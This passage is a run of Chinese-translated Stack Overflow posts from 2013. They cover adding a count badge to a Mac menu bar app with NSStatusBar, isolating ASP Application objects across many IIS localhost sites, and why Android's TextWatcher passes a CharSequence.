$employment_table .= "</table>"; 
```

# objective-c - 带有圆圈数量的 Mac 菜单栏应用程序

> ID：15510979
> 
> 赞同：0
> 
> 时间：2013-03-19T21:39:23.367
> 
> 标签：objective-c

我已经开始学习 Objective-c 并且认为创建一个菜单栏应用程序会很酷。我得到了所有的工作，但想知道像 mint 这样的应用程序如何像 mint 一样在里面放一个带有数字的圆圈：http: [//cl.ly/image/3j2n1A2I2u2q](http://cl.ly/image/3j2n1A2I2u2q)

这是 NSStatusBar 的内置功能吗？还是他们以其他方式做事？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T22:30:22.490

您需要像这样使用 NSStatusBar 类和设置图标：

```
-(void)setupIcon:(NSString*)resourcePath {
    if (self.statusItem == nil) {
        self.statusItem = [[NSStatusBar systemStatusBar] statusItemWithLength:NSSquareStatusItemLength];

        //Loads an image as resource
        NSImage * img = [[[NSImage alloc] initWithContentsOfFile:resourcePath] autorelease];

        if (img == nil) {
            NSLog(@"Could not create image: %@.", resourcePath);
        } else {
            [self.statusItem setImage:img];
        }
    }
} 
```

# iis - 使用实时数据库对多个站点进行本地主机测试 - 分离出“应用程序”对象

> ID：15510997
> 
> 赞同：0
> 
> 时间：2013-03-19T21:40:32.887
> 
> 标签：iis, iis-7, asp-classic, application-pool

我们的应用程序使用配置文件来存储连接字符串。对于现场来说，这只是 2 行。对于 localhost 我们有超过 300 行，用于 150 多个服务器，每次我们想要更改服务器时，我们都必须注释掉当前活动的服务器并取消注释我们想要的服务器。

我刚刚设置了这个，这样我就可以去`http://localhost/hm01/<clientname>.asp`，它会自动获取配置，如下所示：

```
<servers>
    <server name="hm01">
        <setting name="connectionstring_ado" value="..." />
        <setting name="connectionstring_primary" value="..." />
    </server>
</servers> 
```

显然，总共有大约 150 个`server`元素，每个元素都有不同的名称。

我正在使用一个名为`hm01`. 在会话开始时`application("connectionstring") = getconnectionstring("hm01")`，此设置已检测到`/hm01/`在 URL 中。

当我同时查看两个站点时，问题就来了。后者覆盖前者，后者使前者无效-即客户端1不在客户端2的服务器上-因此客户端1在下一页加载时中断。

我想做的是分离出应用程序对象-因此站点 1 与站点 2 具有不同的应用程序对象。我已经读过这可能与不同的应用程序池一起使用。我已经必须在 IIS 中设置 150 个应用程序 - 我真的不想也必须创建 150 个应用程序池，所以我认为这不是一个前进的方向。此外，不仅我必须设置它，而且超过**50 位**其他开发人员也需要。我不相信可以导出应用程序池和应用程序，即使它们可以某些开发人员将客户端文件放在不同的位置。

有没有人对我们如何通过以下功能高效地实现高效的本地主机设置有任何建议： - 只需转到即可轻松使用特定服务器`http://localhost/<servername>/<clientname>` - 易于维护 - 可能在许多开发人员之间共享 IIS 配置 - 易于扩展 -例如添加、编辑或删除服务器

问候，理查德

# java - 对 Edittext 的事件处理响应

> ID：15510998
> 
> 赞同：0
> 
> 时间：2013-03-19T21:40:33.300
> 
> 标签：java, android, char

我对与接​​口相关的方法有疑问`TextWatcher`。

在这种方法中`public void onTextChanged(CharSequence s, int Start, int before, int count)`，为什么`CharSequene`我们在处理数字时使用 ex：在 EditText 框中，我将输入数字而不是字符。

另外，还有其他方法可以使用吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:48:09.077

> 为什么我们在处理数字时使用 CharSequene

此方法不仅限于只接受数字的 EditText，TextWatchers 将返回任何 EditText 的内容。您可以编写自己的方法来仅预测数字，但这可能比将 EditText 限制为仅数字并尝试`Integer.valueOf(s)`（`Float`或其他）并捕获任何异常要慢。

> 另外，还有其他方法可以使用吗？

有两种从 EditText 获取文本`getText()`和使用 TextWatcher 的基本方法。没有仅处理数字的内置方法。